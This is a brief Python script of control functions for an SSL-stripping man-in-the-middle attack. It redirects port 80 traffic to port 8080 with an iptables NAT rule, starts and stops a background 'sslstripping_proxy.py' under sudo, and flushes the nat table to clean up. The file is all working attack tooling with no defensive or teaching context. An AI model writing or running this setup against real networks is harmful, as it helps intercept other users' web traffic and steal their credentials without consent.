import os


def start_iptables_redirect():
    print("[*] Adding iptables rule to redirect port 80 to 8080...")
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

def stop_iptables_redirect():
    print("[*] Flushing iptables nat table...")
    os.system("sudo iptables -t nat -F")

def start_sslstrip():
    print("[*] Starting SSL strip proxy on port 8080...")
    os.system("sudo python2.7 sslstripping_proxy.py &")
    print("[*] SSL strip proxy started.")

def stop_sslstrip():
    print("[*] Stopping custom SSL strip proxy...")
    os.system("sudo pkill -f sslstripping_proxy.py")